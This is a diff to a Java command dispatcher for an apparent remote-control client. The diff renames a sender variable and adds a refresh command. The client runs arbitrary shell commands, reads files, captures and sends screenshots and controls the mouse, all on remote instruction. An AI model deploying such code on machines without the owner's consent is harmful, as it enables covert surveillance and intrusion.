@@ -20,22 +20,20 @@ import java.util.ArrayList;
  **/
 public class CommandList {
 
-    private ArrayList<Command> commands;
-
     private Command message = new Command("msg") {
         @Override
         public void run(String command) {
             Chat chat = Chat.getInstance();
             chat.addMessage("Hermann: " + command.substring(6));
             Console.execute(command);
-            GetContext.SENDER.send("message", "CHAT - Hermann: " + command.substring(6));
+            SystemVariables.SENDER.send("message", "CHAT - Hermann: " + command.substring(6));
         }
     };
 
     private Command ls = new Command("ls") {
         @Override
         public void run(String command) {
-            GetContext.SENDER.send("commandout", System.getProperty("user.dir") + " $ " + command);
+            SystemVariables.SENDER.send("commandout", System.getProperty("user.dir") + " $ " + command);
             new ListFiles().listFiles(command);
         }
     };
@@ -43,7 +41,7 @@ public class CommandList {
     private Command read = new Command("read") {
         @Override
         public void run(String command) {
-            GetContext.SENDER.send("commandout", System.getProperty("user.dir") + " $ " + command);
+            SystemVariables.SENDER.send("commandout", System.getProperty("user.dir") + " $ " + command);
             FileService.readFile(command);
         }
     };
@@ -72,7 +70,7 @@ public class CommandList {
     private Command screenshot = new Command("screenshot") {
         @Override
         public void run(String command) {
-            GetContext.SENDER.send("commandout", "Sending Img");
+            SystemVariables.SENDER.send("commandout", "Sending Img");
             new ImageSender().sendBytes(new Screenshot().takeScreenshot());
         }
     };
@@ -82,7 +80,7 @@ public class CommandList {
         public void run(String command) {
             Mouse mouse = new Mouse();
             mouse.moveMouse(command);
-            GetContext.SENDER.send("commandout", "Mouse moved to " + mouse.getX() + " " + mouse.getY());
+            SystemVariables.SENDER.send("commandout", "Mouse moved to " + mouse.getX() + " " + mouse.getY());
         }
     };
 
@@ -90,14 +88,32 @@ public class CommandList {
         @Override
         public void run(String command) {
             new Mouse().mouseClick();
-            GetContext.SENDER.send("commandout", "Mouse clicked");
+            SystemVariables.SENDER.send("commandout", "Mouse clicked");
+        }
+    };
+
+    private Command refreshTime = new Command("refresh") {
+        @Override
+        public void run(String command) {
+            SystemVariables.REFRESHTIME = Integer.parseInt(command.split(" ")[1]) * 1000;
+            SystemVariables.SENDER.send("commandout", "Command refresh set to " + SystemVariables.REFRESHTIME / 1000 + "s");
+            SystemVariables.SENDER.send("refresh", String.valueOf(SystemVariables.REFRESHTIME / 1000));
         }
     };
 
 
     public void readCommand(String command) {
-        commands = new ArrayList<>();
+        for (Command commandElem : getCommands()) {
+            if (command.startsWith(commandElem.getCommand())) {
+                commandElem.run(command);
+                return;
+            }
+        }
+        executeNormalCommand(command);
+    }
 
+    private ArrayList<Command> getCommands() {
+        ArrayList<Command> commands = new ArrayList<>();
         commands.add(message);
         commands.add(ls);
         commands.add(read);
@@ -107,27 +123,20 @@ public class CommandList {
         commands.add(screenshot);
         commands.add(mouseMove);
         commands.add(mouseClick);
-
-
-        for (Command commandElem : commands) {
-            if (command.startsWith(commandElem.getCommand())) {
-                commandElem.run(command);
-                return;
-            }
-        }
-        executeNormalCommand(command);
+        commands.add(refreshTime);
+        return commands;
     }
 
     private void executeNormalCommand(String command) {
         try {
             if (!command.equals("")) {
                 for (String out : Console.execute(command)) {
-                    GetContext.SENDER.send("commandout", out);
+                    SystemVariables.SENDER.send("commandout", out);
                 }
             }
         } catch (NullPointerException e) {
             e.printStackTrace();
-            GetContext.SENDER.send("errorout", "No command '" + command + "' found");
+            SystemVariables.SENDER.send("errorout", "No command '" + command + "' found");
         }
     }
 
